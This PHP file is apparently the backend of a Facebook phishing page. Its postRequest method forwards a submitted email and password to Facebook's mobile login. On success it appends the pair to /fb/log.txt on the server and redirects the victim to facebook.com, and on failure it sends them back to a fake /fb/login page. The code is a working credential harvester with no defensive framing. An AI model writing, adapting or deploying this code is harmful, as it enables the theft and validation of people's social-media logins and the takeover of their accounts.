<?php


class Parser
{
    public function postRequest($post) {
        $curl = curl_init();
        curl_setopt_array($curl, array(
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_URL => 'https://m.facebook.com/login/',
            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0',
            CURLOPT_SSL_VERIFYHOST => true,
            CURLOPT_SSL_VERIFYPEER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => 'lsd=00000000&jazoest=0000&m_ts=0000000000&li=000000000000000000000000&try_number=0&unrecognized_tries=0&login=%D0%92%D0%BE%D0%B9%D1%82%D0%B8&email=' . $post['email'] . '&pass=' . $post['pass'],
            CURLOPT_FOLLOWLOCATION => true,
        ));
        $response = curl_exec($curl);
        curl_close($curl);
        if(preg_match('/bb j bc/', $response)) {
            $fd = fopen($_SERVER['DOCUMENT_ROOT'] ."/fb/log.txt", 'a+');
            fwrite($fd, $post['email'] . ':' . $post['pass'] . PHP_EOL);
            fclose($fd);
            header('Location: https://facebook.com');
            die();
        } else {
            header('Location: /fb/login');
            die();
        }
    }
}